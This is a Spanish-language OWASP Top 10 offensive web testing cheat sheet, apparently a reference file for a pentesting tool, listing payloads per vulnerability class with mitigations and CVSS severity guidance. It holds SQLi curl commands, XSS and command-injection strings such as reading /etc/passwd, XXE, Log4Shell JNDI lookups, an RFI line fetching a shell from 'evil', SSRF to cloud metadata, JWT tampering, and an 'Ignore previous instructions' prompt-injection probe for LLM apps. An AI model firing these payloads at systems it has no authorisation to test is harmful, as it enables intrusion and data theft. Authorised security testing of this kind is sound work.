# OWASP — Testing Ofensivo Web (Payloads, Deteccion y Reporte)

Referencia de ejecucion ofensiva por clase de vulnerabilidad. Cada hallazgo se reporta con
severidad CVSS (Critical ≥9 / High 7-8.9 / Medium 4-6.9 / Low 0.1-3.9 / Info) y evidencia
en `$BASE/evidence/`. Herramientas de apoyo: `references/web-audit-curl.md` (procedimiento),
`references/curl-http.md` (curl), `references/browser-playwright.md` (DOM/SPA).

## A01 Broken Access Control / IDOR-BOLA
- Probar endpoints sin auth (debe dar 401) y con token de otro rol (403).
- IDOR: `/api/users/1`→`/2`, UUIDs secuenciales, recursos paralelos (`/users/1/avatars`).
- Forzar navegacion: `/admin`, `/api/internal/*`, `/actuator/*`.
- HTTP method tampering: GET→PUT/DELETE; `X-HTTP-Method-Override`.
- Bypass 403 por ruta: `//admin`, `/./admin`, `/admin%2f`, `/%61dmin`, `/admin;`, `..;/` (comandos en web-audit-curl.md §8).
- Bypass por header: `X-Original-URL`, `X-Rewrite-URL`, `X-Custom-IP-Authorization: 127.0.0.1`.
- JWT: decodificar payload (`cut -d. -f2 | base64 -d`), cambiar `role`, `alg:none`, RS256→HS256 confusion, crack secreto (`hashcat -m 16500`).
- Mass assignment: anadir `"role":"admin"`,`"isAdmin":true` al POST/PATCH.

## A02 Cryptographic Failures
- HTTP sin TLS / sin HSTS; cookies sin `Secure`/`HttpOnly`/`SameSite`.
- Algoritmos debiles: MD5/SHA1/DES/RC4 → crack offline con hashcat (SKILL.md §6) o rainbow tables.
- Claves hardcodeadas en JS/`.map` files (grep de secretos: web-audit-curl.md §5).

## A03 Injection
### SQLi (deteccion con curl; automatizar con sqlmap)
```bash
curl -s -o /dev/null -w "%{size_download} %{time_total}\n" "<url>/items?id=1"        # baseline
curl -s --data-urlencode "id=1' OR '1'='1" "<url>/items"                              # booleana true
curl -s --max-time 15 --data-urlencode "id=1' AND SLEEP(5)-- -" "<url>/items"         # time-based
curl -s --data-urlencode "id=1 UNION SELECT NULL,NULL,NULL-- -" "<url>/items"         # union (columnas)
# Error-based: ' ORDER BY 1--  |  OOB (MSSQL): '; EXEC xp_dirtree '\\canary\x'--
```
Mitigacion (para el informe): parameterized queries, ORM, privilegios minimos BD.

### NoSQLi (MongoDB)
`{"user":{"$gt":""},"pass":{"$gt":""}}` · `?id[$ne]=x` · `$where:"1==1"` · bypass login POST JSON.

### Command injection
`; whoami` · `| cat /etc/passwd` · `$(id)` · `` `id` `` · blind OOB: `; ping -c 5 canary` / `; nslookup canary`.

### XSS (reflected / stored / DOM / blind / mXSS)
```
<script>alert(document.domain)</script>       <img src=x onerror=alert(1)>
<svg onload=alert(1)>                         "><script>alert(1)</script>
<details open ontoggle=alert(1)>              <input autofocus onfocus=alert(1)>
javascript:alert(document.cookie)             <iframe src="javascript:alert(1)">
# Bypass filtros: %253Cscript%253E (double enc) · <img src=x onerror=eval(atob(...))> · alert`1` · setTimeout`alert\x281\x29`
# Blind XSS: payload en campo que ve un admin (foros, tickets) con hook a canary propio
# DOM XSS: sinks innerHTML/document.write/location.hash → verificar con browser-playwright.md
```
Mitigacion: output encoding contextual (HTML/attr/JS/CSS/URL), CSP, DOMPurify, Trusted Types.

### SSTI
`{{7*7}}` `${7*7}` `<%= 7*7 %>` `#{7*7}` → si renderiza 49: Jinja2 `{{config}}`, `{{self.__class__...}}`; Java Freemarker `Execute"?new()("id")`.

### XXE
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```
Blind OOB: `<!ENTITY % xxe SYSTEM "http://canary/dtd">` · XInclude sin DOCTYPE: `<xi:include parse="text" href="file:///etc/passwd"/>` · SVG XXE en uploads.

### LFI/RFI
`../../../etc/passwd` · `php://filter/convert.base64-encode/resource=config.php` · log poisoning (UA→access.log) · `data://text/plain;base64,...` · RFI `?page=http://evil/shell.txt`.

### LDAP / XPath
`*)(uid=*))(|(uid=*` · `admin*)(userPassword=*` · `' or '1'='1' or ''='`.

### Log4Shell / log injection
`${jndi:ldap://canary/a}` en headers/params · sanitizar logs, Log4j ≥2.17.

### CRLF / Host header / Email / SSI / GraphQL
- CRLF: `?x=a%0d%0aX-Injected:%20true` · Host: `curl -H "Host: evil.com"` (reset poisoning, cache poisoning)
- Email: `\r\nBcc:` en campos de contacto · SSI: `<!--#exec cmd="ls"-->`
- GraphQL: introspeccion `{__schema{types{name}}}`, batching para brute-force, SQLi en resolvers.

### Prompt injection (apps LLM del target)
`Ignore previous instructions...` / override de system prompt → OWASP LLM Top 10 para el informe.

## A04 Insecure Design
Rate limiting ausente (`scripts/rate-limit-test.sh`), sin lockout, flujo de negocio saltable
(comprar sin pagar), captcha ausente, recuperacion predecible.

## A05 Security Misconfiguration
- Headers ausentes (reportar como conjunto, no uno a uno): `Content-Security-Policy`,
  `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Content-Type-Options: nosniff`,
  `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy`.
- Directorio listing, stack traces, debug en prod, defaults (`admin/admin`) — §7 web-audit-curl.
- `.git`, `.env`, backups — `scripts/route-scan.sh` y §4-5 web-audit-curl.
- CORS: `Access-Control-Allow-Origin: *` con credenciales, `null`, reflejo dinamico sin validar → `scripts/cors-test.sh`.

## A06 Componentes vulnerables
Fingerprint (web-audit-curl §1) → CVEs (§2: NVD/CISA KEV/searchsploit) → verificar explotabilidad
sin danar (§3). En el informe: version + CVE + CVSS + PoC confirmado o teorico.

## A07 Auth / Sesiones
Enum de usuarios por mensaje/timing/distinto status · session fixation · JWT `none`/sin exp ·
cookies de sesion reutilizables tras logout · MFA bypass por API directa · password hashing
(bcrypt/argon2, nunca MD5) · verificacion de token en storage con browser-playwright.

## A08 Integridad de software/datos
Deserializacion insegura (pickle/Java/PHP) · CDN sin SRI · updates sin firma · CI/CD.

## A09 Logging/Monitoring (para recomendaciones)
Sin logs de auth, PII en logs, `console.log` con tokens (caza con `playwright-cli console`), sin alertas.

## A10 SSRF
`http://169.254.169.254/latest/meta-data/` (AWS) · `metadata.google.internal` (GCP) ·
`169.254.169.254/metadata/instance` (Azure) · `file:///etc/passwd` · `gopher://localhost:6379` (Redis) ·
bypasses: `http://127.1`, `2130706433`, `0177.0.0.1`, `[::ffff:127.0.0.1]`, redirects, DNS rebinding.
Confirmar con canary OOB propio, nunca datos reales.

## CSRF (2019-2021 dentro de A01)
Ausencia de token en POST/PUT/DELETE · token predecible/reutilizable · cookie sin `SameSite` →
probar request sin token con `run-code` fetch (browser-playwright). Mitigacion: synchronizer
token + SameSite + verificacion Origin.

## File Upload
`-F "file=@shell.php;type=image/png"` · doble extension `.php.jpg`, `.phtml`, `.php5` · null byte ·
`.htaccess` · SVG con script/XXE · ZIP bomb · verificar donde aterriza y si es ejecutable.
Mitigacion: whitelist magic-bytes, renombrar, fuera de webroot, dominio sandbox, AV scan.

## Subdomain takeover
Subdominio con CNAME a S3/GitHub Pages/Heroku/Netlify/Vercel que responde 404/error del
proveedor → vulnerable. `subfinder` + `httpx`/`dig` (web-pentesting.md).

## HTTP smuggling / cache poisoning (avanzado)
`--http2` vs `--http1.1`, `Transfer-Encoding` duplicado, `CL.TE`/`TE.CL`, headers no
normalizados en clave de cache (`X-Forwarded-Host`) → verificar en trace de curl.

## Reporte — severidades base por hallazgo

| Hallazgo | Severidad base |
|---|---|
| Credencial default valida / RCE confirmado / SQLi con dump | Critical |
| `.env`/`.git` accesible, SQLi/XSS stored, SSRF a metadata, bypass 403→200, login sin rate limit | High |
| API sin rate limit, CORS wildcard con creds, enum usuarios, XSS reflected | Medium |
| Headers de seguridad ausentes, versiones expuestas, info en errores | Low |
| Tecnologia desactualizada sin explotacion confirmada | Info |

Regla de honestidad: sin evidencia de explotacion no se sube severidad; reportar teorico con la version como evidencia.
